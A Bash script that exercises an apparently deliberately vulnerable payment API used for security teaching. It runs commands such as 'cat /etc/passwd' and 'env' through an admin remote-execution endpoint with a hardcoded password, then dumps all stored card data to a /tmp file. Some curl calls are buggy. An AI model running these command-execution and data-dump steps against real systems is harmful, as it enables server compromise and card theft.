#!/bin/bash

# Base URL for the API - modify this as needed
BASE_URL=${1:-"http://localhost:8000"}
echo "Using base URL: $BASE_URL"

# Colors for better readability
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to print section headers
section() {
  echo -e "\n${BLUE}=== $1 ===${NC}"
}

# Function to print subsection headers
subsection() {
  echo -e "\n${YELLOW}--- $1 ---${NC}"
}

# Function to execute curl and format response
execute_curl() {
  description=$1
  shift
  echo -e "${GREEN}$description${NC}"
  echo -e "Command: curl $@\n"
  response=$(curl -s "$@")
  echo "Response:"
  echo $response | python -m json.tool 2>/dev/null || echo $response
  echo -e "\n"
  return "$response"
}

# Function to save response to variable
get_curl() {
  curl -s "$@"
}

# Store generated data
TOKEN=""
USERNAME=""
PASSWORD=""

# Check if API is running
section "CHECKING API CONNECTION"
if curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/docs" | grep -q "200"; then
  echo -e "${GREEN}API is accessible!${NC}"
else
  echo -e "${RED}Error: Cannot connect to API at $BASE_URL${NC}"
  echo "Please check if the API is running and the URL is correct."
  exit 1
fi

# Generate fake user data
section "GENERATING FAKE USER DATA"
user_data=$(curl -s "$BASE_URL/demo/generate-user")
USERNAME=$(echo $user_data | python -m json.tool | grep username | awk '{print $2}' | tr -d '",')
PASSWORD=$(echo $user_data | python -m json.tool | grep password | awk '{print $2}' | tr -d '",')
echo "Generated user data:"
echo $user_data | python -m json.tool
echo -e "Username: $USERNAME"
echo -e "Password: $PASSWORD"

# Register a new user
section "REGISTERING NEW USER"
execute_curl "Register a new user" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$(echo $user_data | python -m json.tool | grep email | awk '{print $2}' | tr -d '",')\"," \
  -d "\"username\":\"$USERNAME\"," \
  -d "\"password\":\"$PASSWORD\"}" \
  "$BASE_URL/register"

# Login to get a token
section "LOGGING IN"
login_response=$(curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&password=$PASSWORD" \
  "$BASE_URL/token")
TOKEN=$(echo $login_response | python -m json.tool | grep access_token | awk '{print $2}' | tr -d '",')
echo "Login response:"
echo $login_response | python -m json.tool
echo -e "Token: $TOKEN\n"

# Test various demo endpoints
section "EXPLORING DEMO DATA ENDPOINTS"

subsection "GENERATING STANDARD FAKE CREDIT CARD"
execute_curl "Generate fake credit card" \
  "$BASE_URL/demo/generate-credit-card"

subsection "GENERATING INSECURE CREDIT CARD WITH FULL DETAILS"
execute_curl "Generate insecure credit card with full details" \
  "$BASE_URL/demo/generate-insecure-credit-card"

subsection "GENERATING FAKE PROFILE"
execute_curl "Generate fake user profile" \
  "$BASE_URL/demo/generate-profile"

subsection "GENERATING FAKE ADDRESS"
execute_curl "Generate fake address" \
  "$BASE_URL/demo/generate-address"

subsection "GENERATING FAKE PRODUCT"
execute_curl "Generate fake product" \
  "$BASE_URL/demo/generate-product"

subsection "GENERATING FAKE TRANSACTION"
execute_curl "Generate fake transaction" \
  "$BASE_URL/demo/generate-transaction"

subsection "GENERATING FAKE REVIEW"
execute_curl "Generate fake review" \
  "$BASE_URL/demo/generate-review"

# Make payments with different card types
section "MAKING PAYMENTS WITH DIFFERENT CARD TYPES"

# Function to create and process a payment with a credit card
process_payment() {
  card_type=$1
  card_number=$2
  card_exp_month=$3
  card_exp_year=$4
  card_cvv=$5
  amount=$6
  
  subsection "PAYMENT WITH $card_type"
  execute_curl "Process payment with $card_type" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"credit_card\":{" \
    -d "\"card_number\":\"$card_number\"," \
    -d "\"expiry_month\":$card_exp_month," \
    -d "\"expiry_year\":$card_exp_year," \
    -d "\"cvv\":\"$card_cvv\"," \
    -d "\"cardholder_name\":\"Test User\"}" \
    -d ", \"amount\": $amount," \
    -d "\"description\": \"Test payment with $card_type\"}" \
    "$BASE_URL/payments"
}

# Process payments with different card types
process_payment "VISA" "4111111111111111" "12" "2028" "123" "99.99"
process_payment "MASTERCARD" "5555555555554444" "10" "2029" "321" "199.50"
process_payment "AMEX" "378282246310005" "6" "2030" "4321" "1299.99"

# Get all payments for the current user
section "GETTING USER PAYMENTS"
execute_curl "Get all user payments" \
  -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/payments"

# Generate fake payment data
section "GENERATING FAKE PAYMENT DATA"
execute_curl "Generate fake payment" \
  "$BASE_URL/demo/generate-payment"

# Create fake payments in the database
section "CREATING FAKE PAYMENTS IN DATABASE"
execute_curl "Create 5 fake payments" \
  -X POST \
  "$BASE_URL/demo/create-fake-payments?count=5"

# Create fake users
section "CREATING FAKE USERS IN DATABASE"
execute_curl "Create 3 fake users" \
  -X POST \
  "$BASE_URL/demo/create-fake-users?count=3"

# Retrieve all credit cards (insecure endpoint)
section "ACCESSING SENSITIVE CARD DATA"
execute_curl "Get all stored credit card details (INSECURE!)" \
  "$BASE_URL/admin/all-credit-cards"

# Test shell command execution
section "EXECUTING SHELL COMMANDS"
# The hardcoded password is required
ADMIN_PASSWORD="super_secret_admin_password_123!"

# Example commands to test
commands=(
  "ls -la"
  "whoami"
  "cat /etc/hostname"
  "ps aux | grep python"
  "netstat -tulpn | grep LISTEN"
  "cat /etc/passwd | head -5"
  "find /app -name '*.py' | head -5"
  "env | grep PATH"
)

for cmd in "${commands[@]}"; do
  subsection "EXECUTING: $cmd"
  execute_curl "Execute command" \
    -X POST \
    -H "Content-Type: application/json" \
    -d "{\"password\":\"$ADMIN_PASSWORD\", \"command\":\"$cmd\"}" \
    "$BASE_URL/admin/execute-command"
done

# Test with wrong password (should fail)
subsection "SECURITY TEST: WRONG PASSWORD"
execute_curl "Execute command with wrong password (should fail)" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"wrong_password\", \"command\":\"ls\"}" \
  "$BASE_URL/admin/execute-command"

# Simulate data exfiltration attack
section "SIMULATING DATA EXFILTRATION"
echo -e "${RED}WARNING: This demonstrates how an attacker might extract sensitive data${NC}"

# Create a script to dump credit card data
subsection "CREATING DATA EXTRACTION SCRIPT"
leak_script="cat << 'EOF' > /tmp/cc_dump.sh
#!/bin/bash
echo 'CREDIT CARD DATA DUMP' > /tmp/stolen_cards.txt
echo '===================' >> /tmp/stolen_cards.txt
curl -s $BASE_URL/admin/all-credit-cards >> /tmp/stolen_cards.txt
echo 'ENVIRONMENT INFO' >> /tmp/stolen_cards.txt
echo '===================' >> /tmp/stolen_cards.txt
env >> /tmp/stolen_cards.txt
echo 'Data exfiltrated to /tmp/stolen_cards.txt'
chmod +x /tmp/cc_dump.sh
EOF"

execute_curl "Creating card data extraction script" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$ADMIN_PASSWORD\", \"command\":\"$leak_script\"}" \
  "$BASE_URL/admin/execute-command"

# Run the extraction script
subsection "RUNNING DATA EXTRACTION"
execute_curl "Running data extraction script" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$ADMIN_PASSWORD\", \"command\":\"bash /tmp/cc_dump.sh\"}" \
  "$BASE_URL/admin/execute-command"

# View the extracted data
subsection "VIEWING EXTRACTED DATA"
execute_curl "Viewing exfiltrated credit card data" \
  -X POST \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$ADMIN_PASSWORD\", \"command\":\"cat /tmp/stolen_cards.txt\"}" \
  "$BASE_URL/admin/execute-command"

# Display security analysis
section "SECURITY ANALYSIS"
echo -e "${RED}CRITICAL SECURITY VULNERABILITIES DETECTED:${NC}"
echo -e "1. ${RED}Full credit card numbers stored in database${NC}"
echo -e "   - Violates PCI DSS compliance requirements"
echo -e "   - Exposes customers to financial fraud"
echo
echo -e "2. ${RED}Remote command execution${NC}"
echo -e "   - Allows attackers to run arbitrary commands on the server"
echo -e "   - Complete system compromise possible"
echo
echo -e "3. ${RED}Hardcoded credentials${NC}"
echo -e "   - Admin password embedded in application code"
echo -e "   - Easy to discover through code review"
echo
echo -e "4. ${RED}APIs exposing sensitive data${NC}"
echo -e "   - Endpoint allows retrieval of all credit card details"
echo -e "   - No proper authorization controls"
echo
echo -e "5. ${RED}Insufficient data validation${NC}"
echo -e "   - No proper validation of credit card data"
echo -e "   - Susceptible to injection attacks"
echo
echo -e "6. ${RED}No transport layer security enforcement${NC}"
echo -e "   - Data transmitted in clear text"
echo
echo -e "7. ${RED}No rate limiting or brute force protection${NC}"
echo -e "   - Authentication endpoints vulnerable to brute force"
echo
echo -e "${RED}WARNING: This application is intentionally vulnerable for educational purposes.${NC}"
echo -e "${RED}NEVER implement these practices in production systems!${NC}"

echo -e "\n${BLUE}=== TEST COMPLETE ===${NC}" 